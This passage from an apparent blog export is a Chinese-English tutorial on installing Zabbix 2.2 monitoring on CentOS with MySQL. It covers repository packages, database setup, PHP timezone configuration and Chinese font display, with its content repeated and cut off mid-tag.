id=\"Installing-Zabbix-packages\"><a href=\"#Installing-Zabbix-packages\" class=\"headerlink\" title=\"Installing Zabbix packages\"></a>Installing Zabbix packages</h3><p>Install Zabbix packages. Example for Zabbix server and web frontend with mysql database.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install zabbix-server-mysql zabbix-web-mysql</span><br></pre></td></tr></table></figure>\n<p>Example for installing Zabbix agent only.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>zabbix-agent&#x9700;&#x8981;&#x5B89;&#x88C5;&#x5728;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x8BE6;&#x89C1;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x6863;&#x300A;zabbix agent&#x5B89;&#x88C5;&#x8BE6;&#x89E3;&#x300B;</p>\n</blockquote>\n<h3 id=\"Creating-initial-database\"><a href=\"#Creating-initial-database\" class=\"headerlink\" title=\"Creating initial database\"></a>Creating initial database</h3><p>Create zabbix database and user on MySQL.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># mysql -uroot</span></span><br><span class=\"line\">mysql&gt; create database zabbix character <span class=\"built_in\">set</span> utf8 collate utf8_bin;</span><br><span class=\"line\">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by <span class=\"string\">&apos;zabbix&apos;</span>;</span><br><span class=\"line\">mysql&gt; <span class=\"built_in\">exit</span></span><br></pre></td></tr></table></figure>\n<p>Import initial schema and data.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/share/doc/zabbix-server-mysql-2.2.0/create</span><br><span class=\"line\">mysql -uroot zabbix &lt; schema.sql</span><br><span class=\"line\">mysql -uroot zabbix &lt; images.sql</span><br><span class=\"line\">mysql -uroot zabbix &lt; data.sql</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Starting-Zabbix-server-process\"><a href=\"#Starting-Zabbix-server-process\" class=\"headerlink\" title=\"Starting Zabbix server process\"></a>Starting Zabbix server process</h3><p>Edit database configuration in zabbix_server.conf<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vi /etc/zabbix/zabbix_server.conf</span></span><br><span class=\"line\">DBHost=localhost</span><br><span class=\"line\">DBName=zabbix</span><br><span class=\"line\">DBUser=zabbix</span><br><span class=\"line\">DBPassword=zabbix</span><br></pre></td></tr></table></figure></p>\n<p>Start Zabbix server process.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service zabbix-server start</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Editing-PHP-configuration-for-Zabbix-frontend\"><a href=\"#Editing-PHP-configuration-for-Zabbix-frontend\" class=\"headerlink\" title=\"Editing PHP configuration for Zabbix frontend\"></a>Editing PHP configuration for Zabbix frontend</h3><p>Apache configuration file for Zabbix frontend is located in /etc/httpd/conf.d/zabbix.conf. Some PHP settings are already configured.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php_value max_execution_time 300</span><br><span class=\"line\">php_value memory_<span class=\"built_in\">limit</span> 128M</span><br><span class=\"line\">php_value post_max_size 16M</span><br><span class=\"line\">php_value upload_max_filesize 2M</span><br><span class=\"line\">php_value max_input_time 300</span><br><span class=\"line\"><span class=\"comment\"># php_value date.timezone Europe/Riga</span></span><br></pre></td></tr></table></figure>\n<p>It&#x2019;s necessary to uncomment the &#x201C;date.timezone&#x201D; setting and set the right timezone for you. After changing the configuration file restart the apache web server.</p>\n<blockquote>\n<p>&#x5982;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x6B64;&#x5904;&#x65F6;&#x533A;&#x914D;&#x7F6E;&#x9879;&#x9700;&#x8981;&#x4FEE;&#x6539;&#xFF0C;&#x53EF;&#x6539;&#x4E3A; php_value date.timezone Asia/Shanghai</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service httpd restart</span><br></pre></td></tr></table></figure>\n<p>Zabbix frontend is available at <a href=\"http://zabbix-frontend-hostname/zabbix\" target=\"_blank\" rel=\"external\">http://zabbix-frontend-hostname/zabbix</a> in the browser.<br>Default username/password is <strong>Admin/zabbix</strong>.</p>\n<p><br></p>\n<hr>\n<h2 id=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;\"><a href=\"#&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;\" class=\"headerlink\" title=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;\"></a>&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;</h2><h3 id=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;\"><a href=\"#&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;\" class=\"headerlink\" title=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;\"></a>&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;</h3><p>&#x3010;&#x767B;&#x9646;&#x3011;-&gt;&#x3010;profile&#x3011;-&gt;&#x3010;User&#x3011;&#xFF0C;language&#x6539;&#x4E3A;chinese[zh_CN].</p>\n<h3 id=\"&#x4E2D;&#x6587;&#x4E71;&#x7801;\"><a href=\"#&#x4E2D;&#x6587;&#x4E71;&#x7801;\" class=\"headerlink\" title=\"&#x4E2D;&#x6587;&#x4E71;&#x7801;\"></a>&#x4E2D;&#x6587;&#x4E71;&#x7801;</h3><p>&#x7531;&#x4E8E;zabbix&#x7684;web&#x524D;&#x7AEF;&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x4E2D;&#x6587;&#x5B57;&#x5E93;&#xFF0C;&#x56E0;&#x6B64;zabbix&#x56FE;&#x5F62;&#x5316;&#x663E;&#x793A;&#x65F6;&#x4E0B;&#x9762;&#x7684;&#x4E2D;&#x6587;&#x90FD;&#x662F;&#x65B9;&#x6846;&#x3002;<br>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x62F7;&#x8D1D;&#x4E2D;&#x6587;&#x5B57;&#x4F53;&#x5230;zabbix&#x524D;&#x7AEF;&#x3002;</p>\n<p>1.&#x8FDB;&#x5165;c:\\Windows\\Fonts&#xFF0C;&#x9009;&#x62E9;&#x5176;&#x4E2D;&#x4EFB;&#x610F;&#x4E00;&#x79CD;&#x4E2D;&#x6587;&#x5B57;&#x5E93;&#x4F8B;&#x5982;&#x6977;&#x4F53;&#x6587;&#x4EF6;simkai.ttf&#xFF0C;&#x5C06;&#x5176;&#x62F7;&#x8D1D;&#x81F3;zabbix&#x7684;web &#x524D;&#x7AEF;&#x9875;&#x9762;&#x5B57;&#x4F53;/usr/share/zabbix/fonts &#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@iZ94ekimlddZ fonts]<span class=\"comment\"># ls</span></span><br><span class=\"line\">graphfont.ttf  simkai.ttf</span><br></pre></td></tr></table></figure></p>\n<p>2.&#x4FEE;&#x6539;zabbix&#x7684;web&#x524D;&#x7AEF; defines.inc.php<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /usr/share/zabbix/include/defines.inc.php</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x627E;&#x5230;</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_FONT_NAME&apos;</span>,                       <span class=\"string\">&apos;DejaVuSans&apos;</span>);</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_GRAPH_FONT_NAME&apos;</span>,                 <span class=\"string\">&apos;DejaVuSans&apos;</span>); </span><br><span class=\"line\"></span><br><span class=\"line\">&#x8FD9;2&#x884C;&#x4FEE;&#x6539;&#x4E3A;</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_FONT_NAME&apos;</span>,                       <span class=\"string\">&apos;SIMKAI&apos;</span>);</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_GRAPH_FONT_NAME&apos;</span>,                 <span class=\"string\">&apos;SIMKAI&apos;</span>); </span><br><span class=\"line\"></span><br><span class=\"line\">&#x4FDD;&#x5B58;&#x9000;&#x51FA;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"&#x5176;&#x4ED6;\"><a href=\"#&#x5176;&#x4ED6;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;\"></a>&#x5176;&#x4ED6;</h2><p><strong>Zabbix&#x5B98;&#x7F51;&#x5B89;&#x88C5;&#x6559;&#x7A0B;(&#x7FFB;&#x5899;)&#xFF1A;</strong><br><a href=\"https://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos\" target=\"_blank\" rel=\"external\">https://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos</a></p>\n<p><strong>zabbix&#x4E2D;&#x6587;&#x64CD;&#x4F5C;&#x624B;&#x518C;&#xFF1A;</strong><br><a href=\"http://pan.baidu.com/s/1i46GoQh\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1i46GoQh</a> &#x5BC6;&#x7801;&#xFF1A;xw5n (&#x624B;&#x518C;&#x4E2D;&#x6709;&#x76F8;&#x5173;shell&#x811A;&#x672C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;)</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/1.png\" alt=\"zabbix&#x4E2D;&#x6587;&#x64CD;&#x4F5C;&#x624B;&#x518C;\"></p>\n<p><strong>zabbix_agentd.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</strong><br><a href=\"http://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/\" target=\"_blank\" rel=\"external\">http://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/</a></p>\n<p><strong>zabbix_server.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</strong><br><a href=\"http://www.ttlsa.com/zabbix/zabbix_server-conf-detail/\" target=\"_blank\" rel=\"external\">http://www.ttlsa.com/zabbix/zabbix_server-conf-detail/</a></p>\n<p><strong>grafana-zabbix&#x63D2;&#x4EF6;&#x5B89;&#x88C5;&#xFF1A;</strong><br>&#x5728;grafana&#x63D2;&#x4EF6;&#x4E2D;&#x5FC3;&#x5B89;&#x88C5;grafana-zabbix&#x63D2;&#x4EF6;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x76F8;&#x5173;&#x6570;&#x636E;&#x6E90;&#xFF1A;<br><a href=\"http://blog.csdn.net/zk673820543/article/details/50617412\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/zk673820543/article/details/50617412</a></p>\n<p><strong>grafana-zabbix&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#x3010;&#x5185;&#x542B;gif&#x56FE;&#x3011;&#xFF1A;</strong><br><a href=\"https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage\" target=\"_blank\" rel=\"external\">https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage</a></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/2.gif\" alt=\"\"></p>\n","excerpt":"<h2 id=\"&#x7B80;&#x4ECB;\"><a href=\"#&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h2><p>zabbix&#xFF08;&#x97F3;&#x540C; z&#xE6;bix&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;WEB&#x754C;&#x9762;&#x7684;&#x63D0;&#x4F9B;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x76D1;&#x89C6;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x76D1;&#x89C6;&#x529F;&#x80FD;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x5F00;&#x6E90;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;<br>zabbix&#x80FD;&#x76D1;&#x89C6;&#x5404;&#x79CD;&#x7F51;&#x7EDC;&#x53C2;&#x6570;&#xFF0C;&#x4FDD;&#x8BC1;&#x670D;&#x52A1;&#x5668;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x8FD0;&#x8425;&#xFF1B;&#x5E76;&#x63D0;&#x4F9B;&#x7075;&#x6D3B;&#x7684;&#x901A;&#x77E5;&#x673A;&#x5236;&#x4EE5;&#x8BA9;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x5FEB;&#x901F;&#x5B9A;&#x4F4D;/&#x89E3;&#x51B3;&#x5B58;&#x5728;&#x7684;&#x5404;&#x79CD;&#x95EE;&#x9898;&#x3002;</p>\n<p>zabbix&#x7531;2&#x90E8;&#x5206;&#x6784;&#x6210;&#xFF0C;zabbix server&#x4E0E;&#x53EF;&#x9009;&#x7EC4;&#x4EF6;zabbix agent&#x3002;<br>zabbix server&#x53EF;&#x4EE5;&#x901A;&#x8FC7;SNMP&#xFF0C;zabbix agent&#xFF0C;ping&#xFF0C;&#x7AEF;&#x53E3;&#x76D1;&#x89C6;&#x7B49;&#x65B9;&#x6CD5;&#x63D0;&#x4F9B;&#x5BF9;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;/&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x7684;&#x76D1;&#x89C6;&#xFF0C;&#x6570;&#x636E;&#x6536;&#x96C6;&#x7B49;&#x529F;&#x80FD;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x5728;Linux&#xFF0C;Solaris&#xFF0C;HP-UX&#xFF0C;AIX&#xFF0C;Free BSD&#xFF0C;Open BSD&#xFF0C;OS X&#x7B49;&#x5E73;&#x53F0;&#x4E0A;&#x3002;</p>\n<hr>\n<h2 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h2><h3 id=\"Installing-repository-configuration-package\"><a href=\"#Installing-repository-configuration-package\" class=\"headerlink\" title=\"Installing repository configuration package\"></a>Installing repository configuration package</h3><p>Zabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm</span><br></pre></td></tr></table></figure>\n<p>Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br></pre></td></tr></table></figure></p>","more":"<p>Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Installing-Zabbix-packages\"><a href=\"#Installing-Zabbix-packages\" class=\"headerlink\" title=\"Installing Zabbix packages\"></a>Installing Zabbix packages</h3><p>Install Zabbix packages. Example for Zabbix server and web frontend with mysql database.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install zabbix-server-mysql zabbix-web-mysql</span><br></pre></td></tr></table></figure>\n<p>Example for installing Zabbix agent only.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>zabbix-agent&#x9700;&#x8981;&#x5B89;&#x88C5;&#x5728;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x8BE6;&#x89C1;&#x53E6;&#x4E00;&#x7BC7;&#x6587;&#x6863;&#x300A;zabbix agent&#x5B89;&#x88C5;&#x8BE6;&#x89E3;&#x300B;</p>\n</blockquote>\n<h3 id=\"Creating-initial-database\"><a href=\"#Creating-initial-database\" class=\"headerlink\" title=\"Creating initial database\"></a>Creating initial database</h3><p>Create zabbix database and user on MySQL.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># mysql -uroot</span></span><br><span class=\"line\">mysql&gt; create database zabbix character <span class=\"built_in\">set</span> utf8 collate utf8_bin;</span><br><span class=\"line\">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by <span class=\"string\">&apos;zabbix&apos;</span>;</span><br><span class=\"line\">mysql&gt; <span class=\"built_in\">exit</span></span><br></pre></td></tr></table></figure>\n<p>Import initial schema and data.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/share/doc/zabbix-server-mysql-2.2.0/create</span><br><span class=\"line\">mysql -uroot zabbix &lt; schema.sql</span><br><span class=\"line\">mysql -uroot zabbix &lt; images.sql</span><br><span class=\"line\">mysql -uroot zabbix &lt; data.sql</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Starting-Zabbix-server-process\"><a href=\"#Starting-Zabbix-server-process\" class=\"headerlink\" title=\"Starting Zabbix server process\"></a>Starting Zabbix server process</h3><p>Edit database configuration in zabbix_server.conf<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vi /etc/zabbix/zabbix_server.conf</span></span><br><span class=\"line\">DBHost=localhost</span><br><span class=\"line\">DBName=zabbix</span><br><span class=\"line\">DBUser=zabbix</span><br><span class=\"line\">DBPassword=zabbix</span><br></pre></td></tr></table></figure></p>\n<p>Start Zabbix server process.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service zabbix-server start</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Editing-PHP-configuration-for-Zabbix-frontend\"><a href=\"#Editing-PHP-configuration-for-Zabbix-frontend\" class=\"headerlink\" title=\"Editing PHP configuration for Zabbix frontend\"></a>Editing PHP configuration for Zabbix frontend</h3><p>Apache configuration file for Zabbix frontend is located in /etc/httpd/conf.d/zabbix.conf. Some PHP settings are already configured.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php_value max_execution_time 300</span><br><span class=\"line\">php_value memory_<span class=\"built_in\">limit</span> 128M</span><br><span class=\"line\">php_value post_max_size 16M</span><br><span class=\"line\">php_value upload_max_filesize 2M</span><br><span class=\"line\">php_value max_input_time 300</span><br><span class=\"line\"><span class=\"comment\"># php_value date.timezone Europe/Riga</span></span><br></pre></td></tr></table></figure>\n<p>It&#x2019;s necessary to uncomment the &#x201C;date.timezone&#x201D; setting and set the right timezone for you. After changing the configuration file restart the apache web server.</p>\n<blockquote>\n<p>&#x5982;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x6B64;&#x5904;&#x65F6;&#x533A;&#x914D;&#x7F6E;&#x9879;&#x9700;&#x8981;&#x4FEE;&#x6539;&#xFF0C;&#x53EF;&#x6539;&#x4E3A; php_value date.timezone Asia/Shanghai</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service httpd restart</span><br></pre></td></tr></table></figure>\n<p>Zabbix frontend is available at <a href=\"http://zabbix-frontend-hostname/zabbix\">http://zabbix-frontend-hostname/zabbix</a> in the browser.<br>Default username/password is <strong>Admin/zabbix</strong>.</p>\n<p><br></p>\n<hr>\n<h2 id=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;\"><a href=\"#&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;\" class=\"headerlink\" title=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;\"></a>&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;&#x53CA;&#x4E2D;&#x6587;&#x4E71;&#x7801;</h2><h3 id=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;\"><a href=\"#&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;\" class=\"headerlink\" title=\"&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;\"></a>&#x4E2D;&#x6587;&#x8BBE;&#x7F6E;</h3><p>&#x3010;&#x767B;&#x9646;&#x3011;-&gt;&#x3010;profile&#x3011;-&gt;&#x3010;User&#x3011;&#xFF0C;language&#x6539;&#x4E3A;chinese[zh_CN].</p>\n<h3 id=\"&#x4E2D;&#x6587;&#x4E71;&#x7801;\"><a href=\"#&#x4E2D;&#x6587;&#x4E71;&#x7801;\" class=\"headerlink\" title=\"&#x4E2D;&#x6587;&#x4E71;&#x7801;\"></a>&#x4E2D;&#x6587;&#x4E71;&#x7801;</h3><p>&#x7531;&#x4E8E;zabbix&#x7684;web&#x524D;&#x7AEF;&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x4E2D;&#x6587;&#x5B57;&#x5E93;&#xFF0C;&#x56E0;&#x6B64;zabbix&#x56FE;&#x5F62;&#x5316;&#x663E;&#x793A;&#x65F6;&#x4E0B;&#x9762;&#x7684;&#x4E2D;&#x6587;&#x90FD;&#x662F;&#x65B9;&#x6846;&#x3002;<br>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x62F7;&#x8D1D;&#x4E2D;&#x6587;&#x5B57;&#x4F53;&#x5230;zabbix&#x524D;&#x7AEF;&#x3002;</p>\n<p>1.&#x8FDB;&#x5165;c:\\Windows\\Fonts&#xFF0C;&#x9009;&#x62E9;&#x5176;&#x4E2D;&#x4EFB;&#x610F;&#x4E00;&#x79CD;&#x4E2D;&#x6587;&#x5B57;&#x5E93;&#x4F8B;&#x5982;&#x6977;&#x4F53;&#x6587;&#x4EF6;simkai.ttf&#xFF0C;&#x5C06;&#x5176;&#x62F7;&#x8D1D;&#x81F3;zabbix&#x7684;web &#x524D;&#x7AEF;&#x9875;&#x9762;&#x5B57;&#x4F53;/usr/share/zabbix/fonts &#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@iZ94ekimlddZ fonts]<span class=\"comment\"># ls</span></span><br><span class=\"line\">graphfont.ttf  simkai.ttf</span><br></pre></td></tr></table></figure></p>\n<p>2.&#x4FEE;&#x6539;zabbix&#x7684;web&#x524D;&#x7AEF; defines.inc.php<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /usr/share/zabbix/include/defines.inc.php</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x627E;&#x5230;</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_FONT_NAME&apos;</span>,                       <span class=\"string\">&apos;DejaVuSans&apos;</span>);</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_GRAPH_FONT_NAME&apos;</span>,                 <span class=\"string\">&apos;DejaVuSans&apos;</span>); </span><br><span class=\"line\"></span><br><span class=\"line\">&#x8FD9;2&#x884C;&#x4FEE;&#x6539;&#x4E3A;</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_FONT_NAME&apos;</span>,                       <span class=\"string\">&apos;SIMKAI&apos;</span>);</span><br><span class=\"line\">define(<span class=\"string\">&apos;ZBX_GRAPH_FONT_NAME&apos;</span>,                 <span class=\"string\">&apos;SIMKAI&apos;</span>); </span><br><span class=\"line\"></span><br><span class=\"line\">&#x4FDD;&#x5B58;&#x9000;&#x51FA;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"&#x5176;&#x4ED6;\"><a href=\"#&#x5176;&#x4ED6;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;\"></a>&#x5176;&#x4ED6;</h2><p><strong>Zabbix&#x5B98;&#x7F51;&#x5B89;&#x88C5;&#x6559;&#x7A0B;(&#x7FFB;&#x5899;)&#xFF1A;</strong><br><a href=\"https://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos\">https://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos</a></p>\n<p><strong>zabbix&#x4E2D;&#x6587;&#x64CD;&#x4F5C;&#x624B;&#x518C;&#xFF1A;</strong><br><a href=\"http://pan.baidu.com/s/1i46GoQh\">http://pan.baidu.com/s/1i46GoQh</a> &#x5BC6;&#x7801;&#xFF1A;xw5n (&#x624B;&#x518C;&#x4E2D;&#x6709;&#x76F8;&#x5173;shell&#x811A;&#x672C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;)</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E5%AE%89%E8%A3%85/1.png\" alt=\"zabbix&#x4E2D;&#x6587;&#x64CD;&#x4F5C;&#x624B;&#x518C;\"></p>\n<p><strong>zabbix_agentd.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</strong><br><a href=\"http://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/\">http://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/</a></p>\n<p><strong>zabbix_server.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</strong><br><a href=\"http://www.ttlsa.com/zabbix/zabbix_server-conf-detail/\">http://www.ttlsa.com/zabbix/zabbix_server-conf-detail/</a></p>\n<p><strong>grafana-zabbix&#x63D2;&#x4EF6;&#x5B89;&#x88C5;&#xFF1A;</strong><br>&#x5728;grafana&#x63D2;&#x4EF6;&#x4E2D;&#x5FC3;&#x5B89;&#x88C5;grafana-zabbix&#x63D2;&#x4EF6;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x76F8;&#x5173;&#x6570;&#x636E;&#x6E90;&#xFF1A;<br><a 